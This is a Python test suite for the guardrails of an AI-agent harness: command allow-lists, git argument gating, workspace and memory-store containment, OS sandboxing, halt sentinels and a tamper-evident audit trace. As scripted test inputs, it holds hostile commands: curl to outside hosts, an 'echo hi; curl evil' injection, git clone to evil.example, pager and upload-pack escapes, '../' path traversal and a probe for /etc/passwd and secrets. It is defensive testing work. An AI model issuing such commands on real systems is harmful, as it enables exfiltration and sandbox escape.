#!/usr/bin/env python3
"""M0 floor tests: manifest enforcement, dry-run, trace, result record.

Offline by design — every run uses the deterministic mock provider, scripted
via the SFMA_MOCK environment variable. Requires node (or deno) on PATH.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import tempfile
import threading
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
AGENT = REPO / "agent.mjs"

if shutil.which("node"):
    RUNNER = ["node", str(AGENT)]
elif shutil.which("deno"):
    RUNNER = ["deno", "run", "-A", str(AGENT)]
else:
    raise RuntimeError("neither node nor deno found on PATH")

CANDIDATE = {
    "mission": "Produce result.json in the workspace.",
    "successCriteria": ["result.json exists in the workspace"],
    "loopRoles": [{"name": "solo", "duty": "do the work"}],
    "firstTasks": [{"id": "t0", "description": "write result.json", "role": "solo", "class": "mechanical"}],
    "schedule": [],
}


class M0Test(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(prefix="sfma-m0-"))
        self.ws = self.dir / "ws"
        self.ws.mkdir()

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def manifest(self, **over):
        m = {
            "name": "m0-test",
            "workspace": str(self.ws),
            "modelEndpoints": [{"name": "mock", "provider": "mock", "model": "m0"}],
            "allowedCommands": ["echo"],
            "inputs": [],
            "outputs": ["result.json"],
            "maxTurns": 6,
            "dryRunDefault": True,
        }
        m.update(over)
        p = self.dir / "manifest.json"
        p.write_text(json.dumps(m))
        return p

    def run_agent(self, manifest, script=None, apply=True, extra_env=None):
        env = {**os.environ}
        if script is not None:
            env["SFMA_MOCK"] = json.dumps(script)
        if extra_env:
            env.update(extra_env)
        args = RUNNER + [str(manifest)] + (["--apply"] if apply else [])
        return subprocess.run(args, capture_output=True, text=True, env=env, timeout=120)

    def record(self):
        return json.loads((self.ws / ".sfma" / "result.json").read_text())

    def traces(self):
        lines = (self.ws / ".sfma" / "trace.jsonl").read_text().strip().splitlines()
        return [json.loads(line) for line in lines]

    def verdicts(self, tier="hard"):
        return [t for t in self.traces() if t["kind"] == "verdict" and t["data"]["tier"] == tier]

    def test_happy_path_apply(self):
        script = [CANDIDATE, {"tool": "write", "path": "result.json", "content": "ok"},
                  {"tool": "done", "summary": "ok"}]
        r = self.run_agent(self.manifest(), script)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertEqual((self.ws / "result.json").read_text(), "ok")
        rec = self.record()
        self.assertEqual(rec["verdict"], "completed")
        self.assertEqual(rec["bootstrap"]["mission"], CANDIDATE["mission"])
        self.assertTrue(rec["outputs"][0]["sha256"])
        self.assertEqual(rec["hardTierFailures"], 0)
        kinds = {t["kind"] for t in self.traces()}
        self.assertLessEqual({"clock-anchor", "lifecycle", "candidate", "call", "task", "verdict", "weight"}, kinds)

    def test_dry_run_writes_nothing(self):
        script = [CANDIDATE, {"tool": "write", "path": "result.json", "content": "ok"},
                  {"tool": "done", "summary": "ok"}]
        r = self.run_agent(self.manifest(), script, apply=False)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertFalse((self.ws / "result.json").exists())
        rec = self.record()
        self.assertTrue(rec["dryRun"])
        self.assertEqual(rec["verdict"], "completed")

    def test_disallowed_command_refused(self):
        script = [CANDIDATE, {"tool": "run", "cmd": "curl http://example.com"},
                  {"tool": "done", "summary": "tried"}]
        r = self.run_agent(self.manifest(), script)
        self.assertEqual(r.returncode, 1)
        self.assertEqual(self.record()["verdict"], "failed")
        fails = [v for v in self.verdicts() if not v["data"]["pass"]]
        self.assertIn("not in allowedCommands", fails[0]["data"]["reason"])

    def test_shell_metacharacters_refused(self):
        script = [CANDIDATE, {"tool": "run", "cmd": "echo hi; curl evil"},
                  {"tool": "done", "summary": "tried"}]
        self.run_agent(self.manifest(), script)
        fails = [v for v in self.verdicts() if not v["data"]["pass"]]
        self.assertIn("metacharacters", fails[0]["data"]["reason"])

    def test_git_gate_refuses_network_and_escape_arguments(self):
        cases = [
            ("git push origin main", "subcommand not permitted"),
            ("git fetch", "subcommand not permitted"),
            ("git clone http://evil.example/repo", "subcommand not permitted"),
            ("git remote add evil http://evil.example", "subcommand not permitted"),
            ("git submodule update", "subcommand not permitted"),
            ("git config core.pager sh", "subcommand not permitted"),
            ("git -c core.pager=sh log", "global flags are not permitted"),
            ("git --exec-path=/tmp/evil log", "global flags are not permitted"),
            ("git --git-dir=/etc/git log", "global flags are not permitted"),
            ("git --work-tree=/ log", "global flags are not permitted"),
            ("git grep -Ovim pattern", "argument not permitted"),
            ("git log --upload-pack=/tmp/evil", "argument not permitted"),
            ("git", "requires a subcommand"),
        ]
        for cmd, expected in cases:
            with self.subTest(cmd=cmd):
                script = [CANDIDATE, {"tool": "run", "cmd": cmd},
                          {"tool": "done", "summary": "tried"}]
                self.run_agent(self.manifest(allowedCommands=["git"]), script, apply=False)
                fails = [v for v in self.verdicts() if not v["data"]["pass"]]
                self.assertTrue(fails, f"{cmd} was not refused")
                self.assertIn(expected, fails[-1]["data"]["reason"])

    def test_git_gate_permits_local_subcommands(self):
        for cmd in ["git log --oneline -3", "git grep -c pattern", "git cat-file -p HEAD",
                    "git rev-list --all", "git notes show", "git gc"]:
            with self.subTest(cmd=cmd):
                script = [CANDIDATE, {"tool": "run", "cmd": cmd},
                          {"tool": "done", "summary": "ok"}]
                self.run_agent(self.manifest(allowedCommands=["git"]), script, apply=False)
                fails = [v for v in self.verdicts() if not v["data"]["pass"]]
                self.assertEqual(fails, [], f"{cmd} was wrongly refused")

    def test_git_memory_store_profiles_and_commits_per_run(self):
        script = [CANDIDATE, {"tool": "write", "path": "result.json", "content": "ok"},
                  {"tool": "done", "summary": "ok"}]
        m = self.manifest()
        self.run_agent(m, script)
        rec = self.record()
        store = rec["memory"]["store"]
        self.assertIsNotNone(store, "git store should be available in test env")
        self.assertEqual(store["name"], "git-long")
        self.assertTrue(store["commit"], "run should leave a memory commit")
        profiles = [t for t in self.traces()
                    if t["kind"] == "store" and t["data"].get("available")]
        self.assertTrue(profiles, "store profile must be traced")
        caps = profiles[0]["data"]["capabilities"]
        self.assertTrue(caps["episodic"] and caps["lexical"] and caps["changePoint"])
        self.assertFalse(caps["semantic"], "git is lexical; semantic must not be claimed")

        self.run_agent(m, script)   # second run -> second DAG node
        memdir = self.ws / ".sfma" / "mem"
        log = subprocess.run(["git", "log", "--oneline"], cwd=memdir,
                             capture_output=True, text=True)
        self.assertEqual(len(log.stdout.strip().splitlines()), 2)
        shown = subprocess.run(["git", "show", "--name-only", "--format=", "HEAD"],
                               cwd=memdir, capture_output=True, text=True)
        self.assertIn("memory.json", shown.stdout)

    def test_memory_store_symlink_refused(self):
        (self.ws / ".sfma").mkdir(parents=True, exist_ok=True)
        outside = self.dir / "outside"
        outside.mkdir()
        (self.ws / ".sfma" / "mem").symlink_to(outside)
        script = [CANDIDATE, {"tool": "done", "summary": "x"}]
        r = self.run_agent(self.manifest(), script)
        self.assertEqual(r.returncode, 1)
        self.assertIn("must not be a symlink", r.stderr)

    def test_memory_store_refuses_enclosing_repository(self):
        outer = self.dir / "outer"
        outer.mkdir()
        subprocess.run(["git", "init", "-q"], cwd=outer, check=True)
        (outer / "agent.mjs").write_text("// decoy source tree\n")
        ws2 = outer / "ws"
        (ws2 / ".sfma" / "mem").mkdir(parents=True)
        (ws2 / ".sfma" / "mem" / ".git").write_text(f"gitdir: {outer}/.git\n")
        script = [CANDIDATE, {"tool": "done", "summary": "x"}]
        r = self.run_agent(self.manifest(workspace=str(ws2)), script)
        self.assertEqual(r.returncode, 1)
        # The attack is a `.git` FILE pointing elsewhere: --show-toplevel then
        # reports the mem dir (looks safe) while objects and refs land in the
        # repository holding agent.mjs. The guard must inspect the git dir.
        self.assertTrue(
            "enclosing repository" in r.stderr or "must be a real repository directory" in r.stderr
            or "containing agent.mjs" in r.stderr,
            f"expected containment abort, got: {r.stderr[:400]}")
        objects = subprocess.run(["git", "log", "--oneline"], cwd=outer,
                                 capture_output=True, text=True)
        self.assertEqual(objects.stdout.strip(), "",
                         "agent must not have committed into the enclosing repository")

    def test_workspace_escape_refused(self):
        script = [CANDIDATE, {"tool": "write", "path": "../evil.txt", "content": "x"},
                  {"tool": "done", "summary": "tried"}]
        r = self.run_agent(self.manifest(), script)
        self.assertEqual(r.returncode, 1)
        self.assertFalse((self.dir / "evil.txt").exists())
        fails = [v for v in self.verdicts() if not v["data"]["pass"]]
        self.assertIn("outside workspace", fails[0]["data"]["reason"])

    def test_undeclared_output_refused(self):
        script = [CANDIDATE, {"tool": "write", "path": "not-declared.txt", "content": "x"},
                  {"tool": "done", "summary": "tried"}]
        r = self.run_agent(self.manifest(), script)
        self.assertEqual(r.returncode, 1)
        self.assertFalse((self.ws / "not-declared.txt").exists())
        fails = [v for v in self.verdicts() if not v["data"]["pass"]]
        self.assertIn("not a declared output", fails[0]["data"]["reason"])

    def test_allowed_command_runs(self):
        script = [CANDIDATE, {"tool": "run", "cmd": "echo floor-ok"},
                  {"tool": "write", "path": "result.json", "content": "ok"},
                  {"tool": "done", "summary": "ok"}]
        r = self.run_agent(self.manifest(), script)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertEqual(self.record()["hardTierFailures"], 0)

    def test_allowed_interpreter_is_os_sandboxed(self):
        probe = """import json, os, pathlib, socket
outside = pathlib.Path('../outside.txt')
outside.write_text('namespace-only')
s = socket.socket(); s.settimeout(0.2)
result = {
    'host_file_visible': pathlib.Path('/etc/passwd').exists(),
    'secret_visible': 'SFMA_TEST_SECRET' in os.environ,
    'network_reachable': s.connect_ex(('1.1.1.1', 80)) == 0,
    'input': pathlib.Path('input.txt').read_text().strip(),
}
pathlib.Path('result.json').write_text(json.dumps(result))
"""
        (self.ws / "probe.py").write_text(probe)
        (self.ws / "input.txt").write_text("declared")
        script = [CANDIDATE, {"tool": "run", "cmd": "python3 probe.py"},
                  {"tool": "done", "summary": "ok"}]
        manifest = self.manifest(allowedCommands=["python3"], inputs=["probe.py", "input.txt"])
        r = self.run_agent(manifest, script, extra_env={"SFMA_TEST_SECRET": "must-not-leak"})
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        data = json.loads((self.ws / "result.json").read_text())
        self.assertEqual(data, {"host_file_visible": False, "secret_visible": False,
                                "network_reachable": False, "input": "declared"})
        self.assertFalse((self.dir / "outside.txt").exists())

    def test_max_turns_halts(self):
        script = [CANDIDATE] + [{"tool": "read", "path": "nope.txt"}] * 20
        r = self.run_agent(self.manifest(maxTurns=4), script)
        self.assertEqual(r.returncode, 1)
        rec = self.record()
        self.assertEqual(rec["verdict"], "halted-maxTurns")
        self.assertEqual(rec["turns"], 4)

    def test_budget_max_model_calls_halts(self):
        script = [CANDIDATE] + [{"tool": "read", "path": "nope.txt"}] * 20
        r = self.run_agent(self.manifest(maxTurns=50, maxModelCalls=3), script)
        self.assertEqual(r.returncode, 1)
        rec = self.record()
        self.assertEqual(rec["verdict"], "halted-budget")
        self.assertEqual(rec["modelCalls"], 3)
        self.assertEqual(rec["budget"]["maxModelCalls"], 3)

    def test_operator_halt_sentinel(self):
        (self.ws / ".sfma").mkdir()
        (self.ws / ".sfma" / "HALT").write_text("")
        script = [CANDIDATE, {"tool": "done", "summary": "never reached"}]
        r = self.run_agent(self.manifest(), script)
        self.assertEqual(r.returncode, 1)
        rec = self.record()
        self.assertEqual(rec["verdict"], "halted-operator")
        self.assertEqual(rec["modelCalls"], 0)
        halts = [t for t in self.traces() if t["kind"] == "result" and "halt" in t["data"]]
        self.assertIn("HALT", halts[0]["data"]["halt"])

    def test_cross_run_memory_certifies_and_pins(self):
        script = [CANDIDATE, {"tool": "write", "path": "result.json", "content": "ok"},
                  {"tool": "done", "summary": "ok"}]
        m = self.manifest(tuning={"certWindow": 2})
        r1 = self.run_agent(m, script)
        self.assertEqual(r1.returncode, 0, r1.stdout + r1.stderr)
        mem = json.loads((self.ws / ".sfma" / "memory.json").read_text())
        self.assertEqual(len(mem["runs"]), 1)
        self.assertIsNone(mem["pinned"])
        r2 = self.run_agent(m, script)
        self.assertEqual(r2.returncode, 0, r2.stdout + r2.stderr)
        mem = json.loads((self.ws / ".sfma" / "memory.json").read_text())
        self.assertEqual(len(mem["runs"]), 2)
        self.assertEqual(mem["pinned"]["candidate"]["mission"], CANDIDATE["mission"])
        self.assertIn("certified", self.record()["lifecycle"])

    def test_pinned_replay_skips_bootstrap(self):
        pin = [CANDIDATE, {"tool": "write", "path": "result.json", "content": "ok"},
               {"tool": "done", "summary": "ok"}]
        m = self.manifest(tuning={"certWindow": 2})
        self.run_agent(m, pin)
        self.run_agent(m, pin)
        replay = [{"tool": "write", "path": "result.json", "content": "replayed"},
                  {"tool": "done", "summary": "ok"}]
        r3 = self.run_agent(m, replay)
        self.assertEqual(r3.returncode, 0, r3.stdout + r3.stderr)
        rec = self.record()
        self.assertEqual(rec["lifecycle"][0], "pinned-replay")
        self.assertEqual(rec["bootstrap"]["mission"], CANDIDATE["mission"])
        self.assertEqual(rec["modelCalls"], 2)
        self.assertEqual((self.ws / "result.json").read_text(), "replayed")

    def test_demotion_on_hard_violation(self):
        pin = [CANDIDATE, {"tool": "write", "path": "result.json", "content": "ok"},
               {"tool": "done", "summary": "ok"}]
        m = self.manifest(tuning={"certWindow": 2})
        self.run_agent(m, pin)
        self.run_agent(m, pin)
        bad = [{"tool": "write", "path": "../evil.txt", "content": "x"},
               {"tool": "done", "summary": "tried"}]
        r3 = self.run_agent(m, bad)
        self.assertEqual(r3.returncode, 1)
        rec = self.record()
        self.assertIn("demoted", rec["lifecycle"])
        self.assertFalse(rec["memory"]["pinned"])
        mem = json.loads((self.ws / ".sfma" / "memory.json").read_text())
        self.assertIsNone(mem["pinned"])

    def test_run_chain_relay(self):
        script = [CANDIDATE, {"tool": "write", "path": "result.json", "content": "ok"},
                  {"tool": "done", "summary": "ok"}]
        m = self.manifest()
        env = {**os.environ, "SFMA_MOCK": json.dumps(script)}
        r = subprocess.run(["node", str(REPO / "scripts" / "run_chain.mjs"), str(m),
                            "--every=0", "--max-runs=2", "--apply"],
                           capture_output=True, text=True, env=env, timeout=120)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertIn("chain: run 2/2", r.stdout)
        mem = json.loads((self.ws / ".sfma" / "memory.json").read_text())
        self.assertEqual(len(mem["runs"]), 2)

    def test_mailbox_notify_and_ask_outbound(self):
        script = [CANDIDATE,
                  {"tool": "notify", "text": "starting the job"},
                  {"tool": "ask", "question": "tabs or spaces?"},
                  {"tool": "write", "path": "result.json", "content": "ok"},
                  {"tool": "done", "summary": "ok"}]
        r = self.run_agent(self.manifest(), script)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        outbox = sorted((self.ws / ".sfma" / "outbox").iterdir())
        self.assertEqual(len(outbox), 2)
        msgs = [json.loads(f.read_text()) for f in outbox]
        self.assertEqual([m["kind"] for m in msgs], ["notify", "ask"])
        self.assertEqual(msgs[1]["text"], "tabs or spaces?")
        out_traces = [t for t in self.traces() if t["kind"] == "message" and t["data"]["dir"] == "out"]
        self.assertEqual(len(out_traces), 2)
        self.assertEqual(self.record()["hardTierFailures"], 0)

    def test_mailbox_inbox_consumed_and_round_trip(self):
        ask = [CANDIDATE, {"tool": "ask", "question": "which format?"},
               {"tool": "done", "summary": "waiting"}]
        m = self.manifest(outputs=[])
        self.run_agent(m, ask)
        (self.ws / ".sfma" / "inbox" / "1-operator.txt").write_text("use JSON format\n")
        answer_run = [CANDIDATE, {"tool": "write", "path": "answered.txt", "content": "ok"},
                      {"tool": "done", "summary": "ok"}]
        r2 = self.run_agent(self.manifest(outputs=["answered.txt"]), answer_run)
        self.assertEqual(r2.returncode, 0, r2.stdout + r2.stderr)
        self.assertEqual(list((self.ws / ".sfma" / "inbox").iterdir()), [])
        in_traces = [t for t in self.traces() if t["kind"] == "message" and t["data"]["dir"] == "in"]
        self.assertEqual(len(in_traces), 1)
        self.assertEqual(in_traces[0]["data"]["text"], "use JSON format")

    def test_telegram_bridge_relay(self):
        import time

        served = {"sends": []}

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self):
                body = json.loads(self.rfile.read(int(self.headers.get("content-length", 0))) or b"{}")
                if self.path.endswith("/getUpdates"):
                    if body.get("offset", 0) == 0:
                        result = [
                            {"update_id": 1, "message": {"chat": {"id": 999, "username": "intruder"}, "text": "evil widen"}},
                            {"update_id": 2, "message": {"chat": {"id": 42, "username": "mitchell"}, "text": "use spaces"}},
                        ]
                    else:
                        time.sleep(0.2)
                        result = []
                else:
                    served["sends"].append(body)
                    result = {}
                out = json.dumps({"ok": True, "result": result})
                self.send_response(200)
                self.send_header("content-type", "application/json")
                self.end_headers()
                self.wfile.write(out.encode())

            def log_message(self, *a):
                pass

        server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        sfma = self.ws / ".sfma"
        (sfma / "outbox").mkdir(parents=True)
        (sfma / "outbox" / "100-ask.json").write_text(json.dumps(
            {"kind": "ask", "text": "tabs or spaces?", "at": "2026-07-06T00:00:00Z"}))
        env = {**os.environ, "TELEGRAM_BOT_TOKEN": "test-token", "TELEGRAM_CHAT_ID": "42",
               "TELEGRAM_API_BASE": f"http://127.0.0.1:{server.server_port}", "TELEGRAM_POLL_TIMEOUT": "1"}
        proc = subprocess.Popen(["node", str(REPO / "scripts" / "telegram_bridge.mjs"), str(self.ws)],
                                env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        try:
            deadline = time.time() + 15
            while time.time() < deadline:
                inbox_files = list((sfma / "inbox").glob("*.txt")) if (sfma / "inbox").exists() else []
                if inbox_files and served["sends"]:
                    break
                time.sleep(0.2)
            self.assertEqual(len(inbox_files), 1, "unauthorized chat must be ignored")
            self.assertIn("telegram-mitchell", inbox_files[0].name)
            self.assertEqual(inbox_files[0].read_text().strip(), "use spaces")
            self.assertEqual(served["sends"][0]["chat_id"], 42)
            self.assertIn("tabs or spaces?", served["sends"][0]["text"])
        finally:
            proc.terminate()
            proc.wait(timeout=10)
            server.shutdown()

    def test_invalid_manifest_rejected(self):
        p = self.manifest()
        p.write_text(json.dumps({"name": "bad", "modelAdapter": "v1"}))
        r = self.run_agent(p, [CANDIDATE])
        self.assertEqual(r.returncode, 2)
        self.assertIn("TASK_INVALID", r.stderr)
        self.assertIn("modelAdapter was replaced", r.stderr)

    def test_oauth_client_credentials_openai_adapter(self):
        served = {"token_calls": 0, "chat_calls": 0, "bearers": []}
        replies = [json.dumps(CANDIDATE),
                   json.dumps({"tool": "write", "path": "result.json", "content": "oauth-ok"}),
                   json.dumps({"tool": "done", "summary": "ok"})]

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self):
                body = self.rfile.read(int(self.headers.get("content-length", 0)))
                if self.path == "/token":
                    served["token_calls"] += 1
                    assert b"grant_type=client_credentials" in body
                    assert b"client_id=test-client" in body
                    out = json.dumps({"access_token": "tok-123", "expires_in": 3600})
                else:
                    served["chat_calls"] += 1
                    served["bearers"].append(self.headers.get("authorization"))
                    out = json.dumps({"choices": [{"message": {"content": replies[min(served["chat_calls"] - 1, 2)]}}]})
                self.send_response(200)
                self.send_header("content-type", "application/json")
                self.end_headers()
                self.wfile.write(out.encode())

            def log_message(self, *a):
                pass

        server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        base = f"http://127.0.0.1:{server.server_port}"
        try:
            manifest = self.manifest(modelEndpoints=[{
                "name": "oauth-openai", "provider": "openai", "model": "gpt-test",
                "baseUrl": base,
                "auth": {"type": "oauth2-client-credentials", "tokenUrl": f"{base}/token",
                         "clientIdEnv": "SFMA_TEST_CID", "clientSecretEnv": "SFMA_TEST_SECRET"},
            }])
            env = {**os.environ, "SFMA_TEST_CID": "test-client", "SFMA_TEST_SECRET": "test-secret"}
            r = subprocess.run(RUNNER + [str(manifest), "--apply"],
                               capture_output=True, text=True, env=env, timeout=120)
            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
            self.assertEqual((self.ws / "result.json").read_text(), "oauth-ok")
            self.assertEqual(served["token_calls"], 1)  # cached across all 3 model calls
            self.assertEqual(served["chat_calls"], 3)
            self.assertEqual(set(served["bearers"]), {"Bearer tok-123"})
        finally:
            server.shutdown()

    def test_codex_oauth_sse_adapter(self):
        served = {"calls": 0, "headers": []}
        replies = [json.dumps(CANDIDATE),
                   json.dumps({"tool": "write", "path": "result.json", "content": "codex-ok"}),
                   json.dumps({"tool": "done", "summary": "ok"})]

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self):
                self.rfile.read(int(self.headers.get("content-length", 0)))
                served["headers"].append({k.lower(): v for k, v in self.headers.items()})
                text = replies[min(served["calls"], 2)]
                served["calls"] += 1
                mid = len(text) // 2
                sse = "".join(
                    f"data: {json.dumps(ev)}\n\n" for ev in [
                        {"type": "response.output_text.delta", "delta": text[:mid]},
                        {"type": "response.output_text.delta", "delta": text[mid:]},
                        {"type": "response.completed", "response": {"output": []}},
                    ])
                self.send_response(200)
                self.send_header("content-type", "text/event-stream")
                self.end_headers()
                self.wfile.write(sse.encode())

            def log_message(self, *a):
                pass

        server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            manifest = self.manifest(modelEndpoints=[{
                "name": "codex", "provider": "codex", "model": "gpt-5.5",
                "baseUrl": f"http://127.0.0.1:{server.server_port}",
            }])
            env = {**os.environ, "OPENAI_CODEX_TOKEN": "codex-tok", "OPENAI_CODEX_ACCOUNT": "acct-42"}
            r = subprocess.run(RUNNER + [str(manifest), "--apply"],
                               capture_output=True, text=True, env=env, timeout=120)
            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
            self.assertEqual((self.ws / "result.json").read_text(), "codex-ok")
            self.assertEqual(served["calls"], 3)
            h = served["headers"][0]
            self.assertEqual(h.get("authorization"), "Bearer codex-tok")
            self.assertEqual(h.get("chatgpt-account-id"), "acct-42")
            self.assertEqual(h.get("openai-beta"), "responses=experimental")
        finally:
            server.shutdown()

    def test_trace_is_ordered_and_anchored(self):
        script = [CANDIDATE, {"tool": "done", "summary": "minimal"}]
        self.run_agent(self.manifest(outputs=[]), script)
        traces = self.traces()
        seqs = [t["seq"] for t in traces]
        self.assertEqual(seqs, sorted(seqs))
        self.assertEqual(len(seqs), len(set(seqs)))
        self.assertEqual(traces[0]["kind"], "clock-anchor")
        self.assertTrue(all(t["anchor"].startswith("clock-anchor-") for t in traces[1:]))
        self.assertTrue(all(len(t["hash"]) == 64 and len(t["prevHash"]) == 64 for t in traces))
        verify = subprocess.run(["node", str(REPO / "scripts" / "verify_audit.mjs"), str(self.ws)],
                                capture_output=True, text=True, timeout=30)
        self.assertEqual(verify.returncode, 0, verify.stdout + verify.stderr)
        self.assertIn("AUDIT_OK signature=none", verify.stdout)

    def test_trace_tampering_is_detected_before_next_run(self):
        script = [CANDIDATE, {"tool": "done", "summary": "minimal"}]
        manifest = self.manifest(outputs=[])
        self.run_agent(manifest, script)
        trace_file = self.ws / ".sfma" / "trace.jsonl"
        lines = trace_file.read_text().splitlines()
        first = json.loads(lines[0]); first["data"]["source"] = "tampered"
        lines[0] = json.dumps(first)
        trace_file.write_text("\n".join(lines) + "\n")
        verify = subprocess.run(["node", str(REPO / "scripts" / "verify_audit.mjs"), str(self.ws)],
                                capture_output=True, text=True, timeout=30)
        self.assertEqual(verify.returncode, 1)
        self.assertIn("AUDIT_INVALID", verify.stderr)
        rerun = self.run_agent(manifest, script)
        self.assertEqual(rerun.returncode, 1)
        self.assertIn("failed hash-chain verification", rerun.stderr)

    def test_ed25519_signed_audit_verifies(self):
        keygen = subprocess.run([
            "node", "-e",
            "const c=require('crypto');const k=c.generateKeyPairSync('ed25519');"
            "console.log(JSON.stringify({privateKey:k.privateKey.export({type:'pkcs8',format:'pem'}),"
            "publicKey:k.publicKey.export({type:'spki',format:'pem'})}))",
        ], capture_output=True, text=True, check=True, timeout=30)
        keys = json.loads(keygen.stdout)
        script = [CANDIDATE, {"tool": "done", "summary": "minimal"}]
        r = self.run_agent(self.manifest(outputs=[]), script,
                           extra_env={"SFMA_AUDIT_PRIVATE_KEY": keys["privateKey"]})
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        verify = subprocess.run(["node", str(REPO / "scripts" / "verify_audit.mjs"), str(self.ws)],
                                capture_output=True, text=True, timeout=30,
                                env={**os.environ, "SFMA_AUDIT_PUBLIC_KEY": keys["publicKey"]})
        self.assertEqual(verify.returncode, 0, verify.stdout + verify.stderr)
        self.assertIn("AUDIT_OK signature=trusted", verify.stdout)


if __name__ == "__main__":
    unittest.main(verbosity=2)
